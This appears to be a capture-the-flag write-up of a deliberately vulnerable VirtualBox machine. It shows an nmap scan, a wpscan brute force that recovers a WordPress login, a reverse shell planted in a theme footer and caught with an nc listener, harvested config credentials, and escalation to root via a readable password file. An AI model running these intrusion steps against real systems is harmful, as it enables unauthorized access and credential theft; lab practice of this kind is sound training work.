@@ -1,0 +1,178 @@
+Nmap scan report for 192.168.56.103
+Host is up (0.00051s latency).
+Not shown: 993 closed ports
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 a2:d3:34:13:62:b1:18:a3:dd:db:35:c5:5a:b7:c0:78 (RSA)
+|   256 85:48:53:2a:50:c5:a0:b7:1a:ee:a4:d8:12:8e:1c:ce (ECDSA)
+|_  256 36:22:92:c7:32:22:e3:34:51:bc:0e:74:9f:1c:db:aa (ED25519)
+53/tcp  open  domain      ISC BIND 9.10.3-P4 (Ubuntu Linux)
+| dns-nsid: 
+|_  bind.version: 9.10.3-P4-Ubuntu
+80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: OPTIONS GET HEAD POST
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+110/tcp open  pop3        Dovecot pop3d
+|_pop3-capabilities: CAPA RESP-CODES UIDL SASL AUTH-RESP-CODE PIPELINING TOP
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+143/tcp open  imap        Dovecot imapd
+|_imap-capabilities: IMAP4rev1 more ID have Pre-login ENABLE listed capabilities LOGIN-REFERRALS LITERAL+ OK post-login LOGINDISABLEDA0001 IDLE SASL-IR
+445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
+MAC Address: 08:00:27:D9:39:B5 (Oracle VirtualBox virtual NIC)
+Service Info: Host: UBUNTU-EXTERMELY-VULNERABLE-M4CH1INE; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: 1h39m57s, deviation: 2h53m13s, median: -2s
+| nbstat: NetBIOS name: UBUNTU-EXTERMEL, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+| Names:
+|   UBUNTU-EXTERMEL<00>  Flags: <unique><active>
+|   UBUNTU-EXTERMEL<03>  Flags: <unique><active>
+|   UBUNTU-EXTERMEL<20>  Flags: <unique><active>
+|   WORKGROUP<00>        Flags: <group><active>
+|_  WORKGROUP<1e>        Flags: <group><active>
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
+|   Computer name: ubuntu-extermely-vulnerable-m4ch1ine
+|   NetBIOS computer name: UBUNTU-EXTERMELY-VULNERABLE-M4CH1INE\x00
+|   Domain name: \x00
+|   FQDN: ubuntu-extermely-vulnerable-m4ch1ine
+|_  System time: 2021-02-03T06:21:59-05:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2021-02-03T11:22:00
+|_  start_date: N/A
+
+i got the hint on apache page saying wordpress is working on ....
+
+http://192.168.56.103/wordpress/
+
+
+we can see one user over there....
+
+
+Posted -----> c0rrupt3d_brain
+
+
+there was also two comment by c0rrupt3d_brain user saying wpscan will help you to get juicy information...
+
+comment was
+
+
+im extremely vulnerable web-app and host is full of bugs. you can brute force me i have bad password set .. you can run wpscan against me to reveal juicy info about vulnerable plugins
+
+
+dont forget to run agressive scan mode
+
+┌─[root@saims0n]─[~/Desktop/.machinenote/Vulnhub_boxes/New_list/Evm]
+└──╼ #wpscan --url http://192.168.56.103/wordpress/ -P /usr/share/wordlists/rockyou.txt -U 'c0rrupt3d_brain'
+
+
+ok so we hava password now....
+
+[+] Performing password attack on Wp Login against 1 user/s
+[SUCCESS] - c0rrupt3d_brain / 24992499                                                                                                                
+Trying c0rrupt3d_brain / 24992499 Time: 00:02:41 <                                                          > (10700 / 14355092)  0.07%  ETA: ??:??:??
+
+[!] Valid Combinations Found:
+ | Username: c0rrupt3d_brain, Password: 24992499
+
+
+ after login to wordpress we update the wordpress themes with our revershell into footer page....
+
+ and then activated the theme and hit the page....
+
+ └──╼ #nc -nlvp 1234
+Listening on 0.0.0.0 1234
+Connection received on 192.168.56.103 49240
+Linux ubuntu-extermely-vulnerable-m4ch1ine 4.4.0-87-generic #110-Ubuntu SMP Tue Jul 18 12:55:35 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
+ 06:50:29 up 32 min,  0 users,  load average: 0.03, 0.26, 0.46
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ 
+
+
+and got the revshell....
+let's escalate our privlages..to user and root...
+
+
+/** The name of the database for WordPress */
+define( 'DB_NAME', 'hackme_wp' );
+
+/** MySQL database username */
+define( 'DB_USER', 'root' );
+
+/** MySQL database password */
+define( 'DB_PASSWORD', '123' );
+
+
+/** The name of the database for WordPress */
+define( 'DB_NAME', 'vulnwp' );
+
+/** MySQL database username */
+define( 'DB_USER', 'root' );
+
+/** MySQL database password */
+define( 'DB_PASSWORD', '123' );
+
+
+we have two db and one pass for msql user....
+
+but password did'nt work....
+then i cd to home 
+
+/bin/cat
+www-data@ubuntu-extermely-vulnerable-m4ch1ine:/home/root3r$ ls -lah
+ls -lah
+total 40K
+drwxr-xr-x 3 www-data www-data 4.0K Nov  1  2019 .
+drwxr-xr-x 3 root     root     4.0K Oct 30  2019 ..
+-rw-r--r-- 1 www-data www-data  515 Oct 30  2019 .bash_history
+-rw-r--r-- 1 www-data www-data  220 Oct 30  2019 .bash_logout
+-rw-r--r-- 1 www-data www-data 3.7K Oct 30  2019 .bashrc
+drwxr-xr-x 2 www-data www-data 4.0K Oct 30  2019 .cache
+-rw-r--r-- 1 www-data www-data   22 Oct 30  2019 .mysql_history
+-rw-r--r-- 1 www-data www-data  655 Oct 30  2019 .profile
+-rw-r--r-- 1 www-data www-data    8 Oct 31  2019 .root_password_ssh.txt
+-rw-r--r-- 1 www-data www-data    0 Oct 30  2019 .sudo_as_admin_successful
+-rw-r--r-- 1 root     root        4 Nov  1  2019 test.txt
+
+
+and got the password file of root
+
+www-data@ubuntu-extermely-vulnerable-m4ch1ine:/home/root3r$ cat .root_password_ssh.txt
+<ulnerable-m4ch1ine:/home/root3r$ cat .root_password_ssh.txt                 
+willy26
+www-data@ubuntu-extermely-vulnerable-m4ch1ine:/home/root3r$ su root
+su root
+Password: willy26
+
+root@ubuntu-extermely-vulnerable-m4ch1ine:/home/root3r# sudo -i
+sudo -i
+root@ubuntu-extermely-vulnerable-m4ch1ine:~# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+root@ubuntu-extermely-vulnerable-m4ch1ine:~# whoami
+whoami
+root
+root@ubuntu-extermely-vulnerable-m4ch1ine:~# 
+root@ubuntu-extermely-vulnerable-m4ch1ine:~# ls
+ls
+proof.txt
+root@ubuntu-extermely-vulnerable-m4ch1ine:~# cat proof.txt
+cat proof.txt
+voila you have successfully pwned me :) !!!
+:D
+
+
+finnaly rooted in less the 30 minitus...
